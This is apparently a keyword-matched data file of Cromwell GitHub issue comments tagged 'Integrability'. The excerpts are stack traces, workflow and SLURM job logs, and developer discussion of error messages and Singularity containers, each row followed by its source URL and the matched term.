Integrability,ead0(Native Method); at java.net.SocketInputStream.socketRead(SocketInputStream.java:116); at java.net.SocketInputStream.read(SocketInputStream.java:170); at java.net.SocketInputStream.read(SocketInputStream.java:141); at sun.security.ssl.InputRecord.readFully(InputRecord.java:465); at sun.security.ssl.InputRecord.read(InputRecord.java:503); at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973); at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:930); at sun.security.ssl.AppInputStream.read(AppInputStream.java:105); at java.io.BufferedInputStream.fill(BufferedInputStream.java:246); at java.io.BufferedInputStream.read1(BufferedInputStream.java:286); at java.io.BufferedInputStream.read(BufferedInputStream.java:345); at sun.net.www.http.HttpClient.parseHTTPHeader(HttpClient.java:704); at sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:647); at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1536); at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1441); at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:480); at sun.net.www.protocol.https.HttpsURLConnectionImpl.getResponseCode(HttpsURLConnectionImpl.java:338); at com.google.api.client.http.javanet.NetHttpResponse.<init>(NetHttpResponse.java:37); at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:94); at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:972); at com.google.api.client.googleapis.batch.BatchRequest.execute(BatchRequest.java:241); at cromwell.backend.impl.jes.statuspolling.JesPollingActor.runBatch(JesPollingActor.scala:67); at cromwell.backend.impl.jes.statuspolling.JesPollingActor.cromwell$backend$impl$jes$statuspolling$JesPollingActor$$handleBatch(JesPollingActor.scala:58); at cromwell.backend.impl.jes.statuspolling.JesPollingActor$$anonfun$receive$1.applyOrElse(JesPollingActor.scala:36); at akka.actor.Actor$class.aroundReceive(Actor.scal,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:2849,protocol,protocol,2849,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['protocol'],['protocol']
Integrability,ectives.scala:66); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$textract$2(BasicDirectives.scala:159); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$mapRequestContext$2(BasicDirectives.scala:43); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$textract$2(BasicDirectives.scala:159); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$2(RouteConcatenation.scala:47); 	at akka.http.scaladsl.util.FastFuture$.strictTransform$1(FastFuture.scala:41); 	at akka.http.scaladsl.util.FastFuture$.transformWith$extension1(FastFuture.scala:45); 	at akka.http.scaladsl.util.FastFuture$.flatMap$extension(FastFuture.scala:26); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$1(RouteConcatenation.scala:44); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$1(RouteConcatenation.scala:44); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$2(RouteConcatenation.scala:47); 	at akka.http.scaladsl.util.FastFuture$.strictTransform$1(FastFuture.scala:41); 	at akka.http.scaladsl.util.FastFuture$.transformWith$extension1(FastFuture.scala:45); 	at akka.http.scaladsl.util.FastFuture$.flatMap$extension(FastFuture.scala:26); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$1(RouteConcatenation.scala:44); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$mapRequestContext$2(BasicDirectives.scala:43); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$textract$2(BasicDirectives.scala:159); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$2(RouteConcatenation.scala:47); 	at akka.http.scaladsl.util.FastFuture$.strictTransform$1(FastFuture.scala:41); 	at akka.http.scaladsl.util.FastFuture$.transformWith$extension1(FastFuture.scala:45); 	at akka.http.scaladsl.util.FastFuture$.flatMap$extension(F,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467133187:2278,Rout,RouteConcatenation,2278,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467133187,2,['Rout'],"['RouteConcatenation', 'RouteWithConcatenation']"
Integrability,"ecutionActor-aed1aad8-588d-4f84-aa09-da0f663d68c0 [UUID(aed1aad8)]: WorkflowExecutionActor [UUID(aed1aad8)] transitioning from WorkflowExecutionPendingState to WorkflowExecutionInProgressState.; 2016-09-09 15:51:00,401 cromwell-system-akka.dispatchers.engine-dispatcher-22 INFO - WorkflowActor-aed1aad8-588d-4f84-aa09-da0f663d68c0 [UUID(aed1aad8)]: transitioning from ExecutingWorkflowState to WorkflowAbortingState; 2016-09-09 15:51:00,401 cromwell-system-akka.dispatchers.engine-dispatcher-20 INFO - WorkflowExecutionActor [UUID(aed1aad8)]: Abort received. Aborting 1 EJEAs; 2016-09-09 15:51:00,402 cromwell-system-akka.dispatchers.engine-dispatcher-20 INFO - WorkflowExecutionActor-aed1aad8-588d-4f84-aa09-da0f663d68c0 [UUID(aed1aad8)]: WorkflowExecutionActor [UUID(aed1aad8)] transitioning from WorkflowExecutionInProgressState to WorkflowExecutionAbortingState.; 2016-09-09 15:51:00,416 cromwell-system-akka.dispatchers.backend-dispatcher-29 ERROR - Unexpected message KvKeyLookupFailed(KvGet(ScopedKey(aed1aad8-588d-4f84-aa09-da0f663d68c0,KvJobKey(printHelloAndGoodbye.echoHelloWorld,None,1),__jes_operation_id))).; 2016-09-09 15:51:01,316 INFO - JesRun [UUID(aed1aad8)printHelloAndGoodbye.echoHelloWorld:NA:1]: JES Run ID is operations/EI6qg4TxKhid_JjDtaqaiegBINHtgZmgHSoPcHJvZHVjdGlvblF1ZXVl; 2016-09-09 15:51:01,532 cromwell-system-akka.dispatchers.backend-dispatcher-29 INFO - $a [UUID(aed1aad8)printHelloAndGoodbye.echoHelloWorld:NA:1]: JesAsyncBackendJobExecutionActor [UUID(aed1aad8):printHelloAndGoodbye.echoHelloWorld:NA:1] Status change from - to Initializing; 2016-09-09 15:51:39,435 cromwell-system-akka.dispatchers.backend-dispatcher-29 INFO - $a [UUID(aed1aad8)printHelloAndGoodbye.echoHelloWorld:NA:1]: JesAsyncBackendJobExecutionActor [UUID(aed1aad8):printHelloAndGoodbye.echoHelloWorld:NA:1] Status change from Initializing to Running; 2016-09-09 15:53:29,935 cromwell-system-akka.dispatchers.backend-dispatcher-29 INFO - $a [UUID(aed1aad8)printHelloAndGoodbye.echoHelloWorld:N",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1253#issuecomment-246048733:4713,message,message,4713,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1253#issuecomment-246048733,1,['message'],['message']
Integrability,"egions:NA:1]: executing: sbatch -J cromwell_9fa3ab92_get_parallel_regions -D /projects/ngs/oncology/dev/bcbio_validation_workflows/somatic-giab-mix/cromwell_work/cromwell-executions/main-somatic-giab-mix.cwl/bc4644da-87f9-4765-9791-9011a2fae80f/call-variantcall/shard-1/wf-variantcall.cwl/9fa3ab92-97fd-4bed-a636-6eaf38941141/call-get_parallel_regions -o /projects/ngs/oncology/dev/bcbio_validation_workflows/somatic-giab-mix/cromwell_work/cromwell-executions/main-somatic-giab-mix.cwl/bc4644da-87f9-4765-9791-9011a2fae80f/call-variantcall/shard-1/wf-variantcall.cwl/9fa3ab92-97fd-4bed-a636-6eaf38941141/call-get_parallel_regions/execution/stdout -e /projects/ngs/oncology/dev/bcbio_validation_workflows/somatic-giab-mix/cromwell_work/cromwell-executions/main-somatic-giab-mix.cwl/bc4644da-87f9-4765-9791-9011a2fae80f/call-variantcall/shard-1/wf-variantcall.cwl/9fa3ab92-97fd-4bed-a636-6eaf38941141/call-get_parallel_regions/execution/stderr -t 1-00:00 -p core --cpus-per-task=1 --mem=4026 --wrap ""/usr/bin/env bash /projects/ngs/oncology/dev/bcbio_validation_workflows/somatic-giab-mix/cromwell_work/cromwell-executions/main-somatic-giab-mix.cwl/bc4644da-87f9-4765-9791-9011a2fae80f/call-variantcall/shard-1/wf-variantcall.cwl/9fa3ab92-97fd-4bed-a636-6eaf38941141/call-get_parallel_regions/execution/script""; [2018-05-02 15:23:01,69] [info] DispatchedConfigAsyncJobExecutionActor [[38;5;2mb0777d55[0mget_parallel_regions:NA:1]: [38;5;5m'bcbio_nextgen.py' 'runfn' 'get_parallel_regions' 'cwl' 'sentinel_runtime=cores,1,ram,3839.9999999999995' 'sentinel_parallel=batch-split' 'sentinel_outputs=region_block' 'sentinel_inputs=batch_rec:record'[0m; [2018-05-02 15:23:01,72] [info] DispatchedConfigAsyncJobExecutionActor [[38;5;2mb0777d55[0mget_parallel_regions:NA:1]: executing: sbatch -J cromwell_b0777d55_get_parallel_regions -D /projects/ngs/oncology/dev/bcbio_validation_workflows/somatic-giab-mix/cromwell_work/cromwell-executions/main-somatic-giab-mix.cwl/bc4644da-87f9-4765-9791-9011a2fae80f",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3584#issuecomment-386387039:3066,wrap,wrap,3066,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3584#issuecomment-386387039,1,['wrap'],['wrap']
Integrability,"egions:NA:1]: executing: sbatch -J cromwell_b0777d55_get_parallel_regions -D /projects/ngs/oncology/dev/bcbio_validation_workflows/somatic-giab-mix/cromwell_work/cromwell-executions/main-somatic-giab-mix.cwl/bc4644da-87f9-4765-9791-9011a2fae80f/call-variantcall/shard-2/wf-variantcall.cwl/b0777d55-4f75-47aa-9655-3119936b10a5/call-get_parallel_regions -o /projects/ngs/oncology/dev/bcbio_validation_workflows/somatic-giab-mix/cromwell_work/cromwell-executions/main-somatic-giab-mix.cwl/bc4644da-87f9-4765-9791-9011a2fae80f/call-variantcall/shard-2/wf-variantcall.cwl/b0777d55-4f75-47aa-9655-3119936b10a5/call-get_parallel_regions/execution/stdout -e /projects/ngs/oncology/dev/bcbio_validation_workflows/somatic-giab-mix/cromwell_work/cromwell-executions/main-somatic-giab-mix.cwl/bc4644da-87f9-4765-9791-9011a2fae80f/call-variantcall/shard-2/wf-variantcall.cwl/b0777d55-4f75-47aa-9655-3119936b10a5/call-get_parallel_regions/execution/stderr -t 1-00:00 -p core --cpus-per-task=1 --mem=4026 --wrap ""/usr/bin/env bash /projects/ngs/oncology/dev/bcbio_validation_workflows/somatic-giab-mix/cromwell_work/cromwell-executions/main-somatic-giab-mix.cwl/bc4644da-87f9-4765-9791-9011a2fae80f/call-variantcall/shard-2/wf-variantcall.cwl/b0777d55-4f75-47aa-9655-3119936b10a5/call-get_parallel_regions/execution/script""; [2018-05-02 15:23:01,86] [info] DispatchedConfigAsyncJobExecutionActor [[38;5;2mb4328660[0mget_parallel_regions:NA:1]: [38;5;5m'bcbio_nextgen.py' 'runfn' 'get_parallel_regions' 'cwl' 'sentinel_runtime=cores,1,ram,3839.9999999999995' 'sentinel_parallel=batch-split' 'sentinel_outputs=region_block' 'sentinel_inputs=batch_rec:record'[0m; [2018-05-02 15:23:01,86] [info] DispatchedConfigAsyncJobExecutionActor [[38;5;2mb4328660[0mget_parallel_regions:NA:1]: executing: sbatch -J cromwell_b4328660_get_parallel_regions -D /projects/ngs/oncology/dev/bcbio_validation_workflows/somatic-giab-mix/cromwell_work/cromwell-executions/main-somatic-giab-mix.cwl/bc4644da-87f9-4765-9791-9011a2fae80f",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3584#issuecomment-386387039:4823,wrap,wrap,4823,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3584#issuecomment-386387039,1,['wrap'],['wrap']
Integrability,"egions:NA:1]: executing: sbatch -J cromwell_b4328660_get_parallel_regions -D /projects/ngs/oncology/dev/bcbio_validation_workflows/somatic-giab-mix/cromwell_work/cromwell-executions/main-somatic-giab-mix.cwl/bc4644da-87f9-4765-9791-9011a2fae80f/call-variantcall/shard-0/wf-variantcall.cwl/b4328660-38fb-4bd7-8220-cd2f47bb26b2/call-get_parallel_regions -o /projects/ngs/oncology/dev/bcbio_validation_workflows/somatic-giab-mix/cromwell_work/cromwell-executions/main-somatic-giab-mix.cwl/bc4644da-87f9-4765-9791-9011a2fae80f/call-variantcall/shard-0/wf-variantcall.cwl/b4328660-38fb-4bd7-8220-cd2f47bb26b2/call-get_parallel_regions/execution/stdout -e /projects/ngs/oncology/dev/bcbio_validation_workflows/somatic-giab-mix/cromwell_work/cromwell-executions/main-somatic-giab-mix.cwl/bc4644da-87f9-4765-9791-9011a2fae80f/call-variantcall/shard-0/wf-variantcall.cwl/b4328660-38fb-4bd7-8220-cd2f47bb26b2/call-get_parallel_regions/execution/stderr -t 1-00:00 -p core --cpus-per-task=1 --mem=4026 --wrap ""/usr/bin/env bash /projects/ngs/oncology/dev/bcbio_validation_workflows/somatic-giab-mix/cromwell_work/cromwell-executions/main-somatic-giab-mix.cwl/bc4644da-87f9-4765-9791-9011a2fae80f/call-variantcall/shard-0/wf-variantcall.cwl/b4328660-38fb-4bd7-8220-cd2f47bb26b2/call-get_parallel_regions/execution/script""; [2018-05-02 15:23:02,64] [info] DispatchedConfigAsyncJobExecutionActor [[38;5;2m9fa3ab92[0mget_parallel_regions:NA:1]: job id: 134058; [2018-05-02 15:23:02,64] [info] DispatchedConfigAsyncJobExecutionActor [[38;5;2mb0777d55[0mget_parallel_regions:NA:1]: job id: 134059; [2018-05-02 15:23:02,64] [info] DispatchedConfigAsyncJobExecutionActor [[38;5;2mb4328660[0mget_parallel_regions:NA:1]: job id: 134060; [2018-05-02 15:23:02,64] [info] DispatchedConfigAsyncJobExecutionActor [[38;5;2mb0777d55[0mget_parallel_regions:NA:1]: Status change from - to WaitingForReturnCodeFile; [2018-05-02 15:23:02,65] [info] DispatchedConfigAsyncJobExecutionActor [[38;5;2mb4328660[0mget_parallel_reg",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3584#issuecomment-386387039:6580,wrap,wrap,6580,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3584#issuecomment-386387039,1,['wrap'],['wrap']
Integrability,enation.$anonfun$$tilde$2(RouteConcatenation.scala:47); 	at akka.http.scaladsl.util.FastFuture$.strictTransform$1(FastFuture.scala:41); 	at akka.http.scaladsl.util.FastFuture$.transformWith$extension1(FastFuture.scala:45); 	at akka.http.scaladsl.util.FastFuture$.flatMap$extension(FastFuture.scala:26); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$1(RouteConcatenation.scala:44); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$1(RouteConcatenation.scala:44); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$2(RouteConcatenation.scala:47); 	at akka.http.scaladsl.util.FastFuture$.strictTransform$1(FastFuture.scala:41); 	at akka.http.scaladsl.util.FastFuture$.transformWith$extension1(FastFuture.scala:45); 	at akka.http.scaladsl.util.FastFuture$.flatMap$extension(FastFuture.scala:26); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$1(RouteConcatenation.scala:44); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$mapRequestContext$2(BasicDirectives.scala:43); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$textract$2(BasicDirectives.scala:159); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$2(RouteConcatenation.scala:47); 	at akka.http.scaladsl.util.FastFuture$.strictTransform$1(FastFuture.scala:41); 	at akka.http.scaladsl.util.FastFuture$.transformWith$extension1(FastFuture.scala:45); 	at akka.http.scaladsl.util.FastFuture$.flatMap$extension(FastFuture.scala:26); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$1(RouteConcatenation.scala:44); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$1(RouteConcatenation.scala:44); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$mapRouteResultWith$2(BasicDirectives.scala:72); 	at akka.http.scaladsl.server.di,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467133187:2705,Rout,RouteConcatenation,2705,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467133187,1,['Rout'],['RouteConcatenation']
Integrability,"er-20 INFO - WorkflowExecutionActor [UUID(aed1aad8)]: Abort received. Aborting 1 EJEAs; 2016-09-09 15:51:00,402 cromwell-system-akka.dispatchers.engine-dispatcher-20 INFO - WorkflowExecutionActor-aed1aad8-588d-4f84-aa09-da0f663d68c0 [UUID(aed1aad8)]: WorkflowExecutionActor [UUID(aed1aad8)] transitioning from WorkflowExecutionInProgressState to WorkflowExecutionAbortingState.; 2016-09-09 15:51:00,416 cromwell-system-akka.dispatchers.backend-dispatcher-29 ERROR - Unexpected message KvKeyLookupFailed(KvGet(ScopedKey(aed1aad8-588d-4f84-aa09-da0f663d68c0,KvJobKey(printHelloAndGoodbye.echoHelloWorld,None,1),__jes_operation_id))).; 2016-09-09 15:51:01,316 INFO - JesRun [UUID(aed1aad8)printHelloAndGoodbye.echoHelloWorld:NA:1]: JES Run ID is operations/EI6qg4TxKhid_JjDtaqaiegBINHtgZmgHSoPcHJvZHVjdGlvblF1ZXVl; 2016-09-09 15:51:01,532 cromwell-system-akka.dispatchers.backend-dispatcher-29 INFO - $a [UUID(aed1aad8)printHelloAndGoodbye.echoHelloWorld:NA:1]: JesAsyncBackendJobExecutionActor [UUID(aed1aad8):printHelloAndGoodbye.echoHelloWorld:NA:1] Status change from - to Initializing; 2016-09-09 15:51:39,435 cromwell-system-akka.dispatchers.backend-dispatcher-29 INFO - $a [UUID(aed1aad8)printHelloAndGoodbye.echoHelloWorld:NA:1]: JesAsyncBackendJobExecutionActor [UUID(aed1aad8):printHelloAndGoodbye.echoHelloWorld:NA:1] Status change from Initializing to Running; 2016-09-09 15:53:29,935 cromwell-system-akka.dispatchers.backend-dispatcher-29 INFO - $a [UUID(aed1aad8)printHelloAndGoodbye.echoHelloWorld:NA:1]: JesAsyncBackendJobExecutionActor [UUID(aed1aad8):printHelloAndGoodbye.echoHelloWorld:NA:1] Status change from Running to Success; 2016-09-09 15:53:31,525 cromwell-system-akka.dispatchers.engine-dispatcher-24 WARN - WorkflowExecutionActor-aed1aad8-588d-4f84-aa09-da0f663d68c0 [UUID(aed1aad8)]: WorkflowExecutionActor [UUID(aed1aad8)] received an unhandled message: SucceededResponse(printHelloAndGoodbye.echoHelloWorld:-1:1,Some(0),Map()) in state: WorkflowExecutionAbortingState; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1253#issuecomment-246048733:6108,message,message,6108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1253#issuecomment-246048733,1,['message'],['message']
Integrability,"ervice account mode. Removing the `GenomicsScopes.all` from `GoogleScopes` fixes the problem but (presumably) will break `application-default`:. ```; 2015-12-21 14:05:11,203 cromwell-system-akka.actor.default-dispatcher-2 WARN - JesBackend [UUID(60f8d0d3)]: 400 Bad Request; {; ""code"" : 400,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Invalid value for field \""serviceAccount.scopes\"": element 1: invalid scope name: https://www.googleapis.com/auth/cloud-platform"",; ""reason"" : ""badRequest""; } ],; ""message"" : ""Invalid value for field \""serviceAccount.scopes\"": element 1: invalid scope name: https://www.googleapis.com/auth/cloud-platform"",; ""status"" : ""INVALID_ARGUMENT""; }; com.google.api.client.googleapis.json.GoogleJsonResponseException: 400 Bad Request; {; ""code"" : 400,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Invalid value for field \""serviceAccount.scopes\"": element 1: invalid scope name: https://www.googleapis.com/auth/cloud-platform"",; ""reason"" : ""badRequest""; } ],; ""message"" : ""Invalid value for field \""serviceAccount.scopes\"": element 1: invalid scope name: https://www.googleapis.com/auth/cloud-platform"",; ""status"" : ""INVALID_ARGUMENT""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145) ~[google-api-client-1.20.0.jar:1.20.0]; at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113) ~[google-api-client-1.20.0.jar:1.20.0]; at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40) ~[google-api-client-1.20.0.jar:1.20.0]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest$1.interceptResponse(AbstractGoogleClientRequest.java:321) ~[google-api-client-1.20.0.jar:1.20.0]; at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:1056) ~[google-http-client-1.20.0.jar:1.20.0]; at com.google.a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/338#issuecomment-166392486:1049,message,message,1049,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/338#issuecomment-166392486,1,['message'],['message']
Integrability,"etween one another, and even to the host, is not completely implemented yet. This comes down to OCI compliance, and having a way for some host to manage all of its Singularity containers. Right now we just have start and stop, but we can't connect containers, define ports, or even easily get a PID. It could (sort of?) be hacked, but we would be better off waiting for that nice standard. ## Reproducible Binary (Workflow Step) vs. Environment. There is also a distinction that I haven't completely wrapped my head around. Docker is very commonly used as an environment - you put a bunch of software (e.g., samtools, bwa aligner, etc.) and then issue commands to the container with custom things. Singularity, in my mind, to be truly a reproducible thing is more of the workflow step or script. It will have the software inside, but better should have those same commands represented with internal modularity. I could arguably completely do away with the external workflow dependency if a single binary told me how to run itself, and then had more than one entrypoint defined for each step. I wouldn't need to care about the software or components inside because my host just needs to run Singularity. A container should almost be more like a hard coded binary step instead of a ""come into the environment and play around, the water's fine!"" It's a little bit like the ICD 10 decision to give a unique id to every combination of things (e.g., ""got hit on the road by a chicken"") instead of combinations of them, eg. (""got hit"" + ""by chicken""). The first is harder because you represent more things (more containers), but the second isn't reproducible because if you lose ""by chicken"" you've lost the entire workflow. Does that make sense?. ## What can/should we do now?. So there are two things to think about. With the current representation of a workflow, we would want Singularity to be OCI compliant, and I would propose a plan to move forward is to expect this, and contribute to Singularity its",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-416418214:4795,depend,dependency,4795,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-416418214,1,['depend'],['dependency']
Integrability,"example of this - in one of my tests i was generating ~1000 metadata requests per second. every single one of those in turn generated a message back to my original actor which was ignored, which would slow down the original actor.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1811#issuecomment-270128566:136,message,message,136,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1811#issuecomment-270128566,1,['message'],['message']
Integrability,for the integration test suggestion https://broadworkbench.atlassian.net/browse/BA-6526,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5584#issuecomment-664506839:8,integrat,integration,8,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5584#issuecomment-664506839,1,['integrat'],['integration']
Integrability,"hands on keyboard effort is relatively low. the real work is defining how to specify it, although now that we have the snazzy new CLI interface it's probably pretty simple to do so",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1578#issuecomment-328279623:134,interface,interface,134,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1578#issuecomment-328279623,1,['interface'],['interface']
Integrability,"hey I noticed that you guys use Google Cloud? http://cromwell.readthedocs.io/en/develop/wf_options/Google/ I have a builder that runs here, so there might be some synthesis between the two, although I'm not super familiar with Cromwell. If you just need to use Singularity containers your best bet is to do a singularity pull (and wrap these commands into your workflow functions, allowing the user to specify the container uri). if there is more of a service that someone is running with cromwell and you want to dip into the storage directly (and would use the API en masse) then we could try this --> https://cloud.google.com/storage/docs/requester-pays",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-385579273:331,wrap,wrap,331,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-385579273,1,['wrap'],['wrap']
Integrability,hmm so the whole subworkflow thing was a red 🐟 because the error message was so bad? 😬,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5260#issuecomment-550346347:65,message,message,65,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5260#issuecomment-550346347,1,['message'],['message']
Integrability,"https://gatkforums.broadinstitute.org/firecloud/discussion/11853/error-message-the-job-was-aborted-from-outside-cromwell. AC: The message ""Job was aborted from outside Cromwell"" itself doesn't have enough information to understand what happened, and what to do next. It seems like there are two known failures that can lead to that error message:. 1. As described above, when an operation self-cancels due to a timeout, Cromwell could supplement the existing message with:; ```Jobs that run for longer than a week are not yet supported, and thus this job was cancelled because it exceeded that upper-limit. Please try to reduce the duration of your job. To get more details about your jobs, here are links to the stdout/stderr files...```. 2. As described in the forum post above, when Cromwell restarts a workflow and a job had been started by the engine/backend but didn't have an op id -- it gets marked as a failed job with the same error. Instead, if Cromwell knows that the reason it couldn't find an op id was because it is restarting -- then it should not report the message it does today at all and simply say:; ```When Cromwell restarted, it realized the job was not yet started, and so this is a benign failure. Cromwell will try attempting to execute this job again.```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2496#issuecomment-424966266:71,message,message-the-job-was-aborted-from-outside-cromwell,71,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2496#issuecomment-424966266,5,['message'],"['message', 'message-the-job-was-aborted-from-outside-cromwell']"
Integrability,https://gatkforums.broadinstitute.org/firecloud/discussion/12490/getting-lots-of-papi-error-code-10-message-14-errors,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3855#issuecomment-424963752:100,message,message-,100,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3855#issuecomment-424963752,1,['message'],['message-']
Integrability,ider software.amazon.awssdk.http.apache.ApacheSdkHttpService not found; 	at java.util.ServiceLoader.fail(ServiceLoader.java:239); 	at java.util.ServiceLoader.access$300(ServiceLoader.java:185); 	at java.util.ServiceLoader$LazyIterator.nextService(ServiceLoader.java:372); 	at java.util.ServiceLoader$LazyIterator.next(ServiceLoader.java:404); 	at java.util.ServiceLoader$1.next(ServiceLoader.java:480); 	at software.amazon.awssdk.core.internal.http.loader.ClasspathSdkHttpServiceProvider.loadService(ClasspathSdkHttpServiceProvider.java:53); 	at java.util.stream.ReferencePipeline$3$1.accept(ReferencePipeline.java:193); 	at java.util.Spliterators$ArraySpliterator.tryAdvance(Spliterators.java:958); 	at java.util.stream.ReferencePipeline.forEachWithCancel(ReferencePipeline.java:126); 	at java.util.stream.AbstractPipeline.copyIntoWithCancel(AbstractPipeline.java:498); 	at java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:485); 	at java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:471); 	at java.util.stream.FindOps$FindOp.evaluateSequential(FindOps.java:152); 	at java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:234); 	at java.util.stream.ReferencePipeline.findFirst(ReferencePipeline.java:464); 	at software.amazon.awssdk.core.internal.http.loader.SdkHttpServiceProviderChain.loadService(SdkHttpServiceProviderChain.java:44); 	at software.amazon.awssdk.core.internal.http.loader.CachingSdkHttpServiceProvider.loadService(CachingSdkHttpServiceProvider.java:46); 	at software.amazon.awssdk.core.internal.http.loader.DefaultSdkHttpClientBuilder.buildWithDefaults(DefaultSdkHttpClientBuilder.java:40); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.lambda$resolveSyncHttpClient$4(SdkDefaultClientBuilder.java:245); 	at java.util.Optional.orElseGet(Optional.java:267); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.resolveSyncHttpClient(SdkDefaultClientBuilder.java:245); 	at software.amazon.awssd,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273:6778,wrap,wrapAndCopyInto,6778,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273,2,['wrap'],['wrapAndCopyInto']
